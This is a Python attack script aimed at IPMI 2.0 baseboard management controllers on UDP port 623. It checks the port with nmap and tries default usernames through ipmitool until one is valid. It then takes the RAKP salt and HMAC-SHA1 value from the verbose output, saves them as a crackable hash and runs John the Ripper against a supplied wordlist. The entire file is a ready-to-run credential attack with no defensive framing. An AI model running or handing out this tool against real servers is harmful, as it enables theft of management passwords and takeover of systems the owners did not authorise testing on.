#!/usr/bin/python3

import signal, sys, os, time, nmap, pdb, shlex, subprocess, re
from colorama import Fore, init

# reset to dafault color
init(autoreset=True)

# colors
red, yellow, magenta, green = Fore.RED, Fore.YELLOW, Fore.MAGENTA, Fore.GREEN 

# help
def help_panel():
    print(f"\n{magenta}[*] Use : {yellow}{sys.argv[0]} <target> <password_wordlist>")
    sys.exit()

if len(sys.argv) != 3: help_panel() 

def signal_handler(signum, frame):
    print("\nSignum : {} , Frame : {}".format(signum, frame))
    print("\n{red}[!] Exiting...")
    exit(1)

#ctrl + c
signal.signal(signal.SIGINT, signal_handler)

# check connection
def checkConnection(target, port):
    print(f"\n{yellow}[+] Checking if port {magenta}{port} {yellow}is open...")
    time.sleep(2)
    scanning = nmap.PortScanner()
    result = scanning.scan(target, port, arguments='-sU')
    if result['scan'] == {} or result['scan'][target]['udp'][int(port)]['state'] == 'closed':
        print(f"\n{red}[-] Port {magenta}{port} {red}is closed!")
        sys.exit()

# check parameters
def checkParameters(target, port, user, wordlist):
    print(f"\n{yellow}[+] Using a list of {magenta}users {yellow}by default...")
    time.sleep(1)
    if wordlist:
        if not os.path.isfile(wordlist):
            print(f"\n{red}[!] The password wordlist {magenta}{wordlist} {red}is invalid ***")
            sys.exit()

# extract user hash
def getUserHash(target, port, user):
    i = 0
    for u in user:
        output = subprocess.run(shlex.split(f"ipmitool -I lanplus -H {target} -U {u} -P password -vvv 2>&1"), capture_output=True)
        stderr, stdout = output.stderr.decode(), output.stdout.decode()
    
        if 'illegal parameter' in stderr or 'unauthorized name' in stderr:
            print(f"{red}[!] Wrong username {magenta}{u} {red}***")
            i+=1
            pass
        else:
            print(f"\n{yellow}[+] The username {magenta}{u} {yellow}is {green}valid{yellow}...")
            time.sleep(2)
            break
        
        if 'insuficient resources for session' in stderr: 
            print(f"\n{red}[!] Insuficient resources for session! ***"); sys.exit()
   
    user = user[i]
    # extract data to salt
    data = re.findall(r"rakp2 mac input buffer \(.*\)\s+(?: .*?\n)+\>\> rakp2 mac key", stderr)[0]
    data = re.sub(f"rakp2 mac input buffer \(.*\)\n", "", data).replace("\n>> rakp2 mac key", "").replace("\n", "").split(" ")
    salt = ''.join(data)

    # extract hash
    user_hash = re.findall(r"Key exchange auth code \[sha1\] : (.*?)\n?$", stdout)[0].replace("0x", "")
    final_hash = f"$rakp${salt}${user_hash}"
    
    print(f"\n{yellow}[+] The hash for user {magenta}{user}: {green}{final_hash}")
    # load hash
    hash_file = 'hash'
    with open(hash_file, "w") as f:
        f.write(f"{target} {user}:{final_hash}")
        f.close
    return hash_file

# cracking hash with jhon
def cracking(wordlist, hash_file):
    time.sleep(2)
    print(f"\n{yellow}[+] Cracking hash with {magenta}John {yellow}tool...")
    time.sleep(2)
    subprocess.run(shlex.split(f"john --wordlist={wordlist} \"{hash_file}\""))

def run():
    if os.getuid() != 0:
        print("\n[*]{yellow} You must be {red}root {yellow}to run the script!")
        sys.exit() 
    # asign variables
    target = sys.argv[1]
    port = 623
    user = ["ADMIN", "admin", "Administrator", "root", "USERID", "guest", "Admin"]
    wordlist = sys.argv[2]

    checkConnection(target, str(port))
    checkParameters(target, port, user, wordlist)
    
    if user:
        hash_file = getUserHash(target, port, user)
        cracking(wordlist, hash_file)

# main
if __name__ == '__main__':
    run()
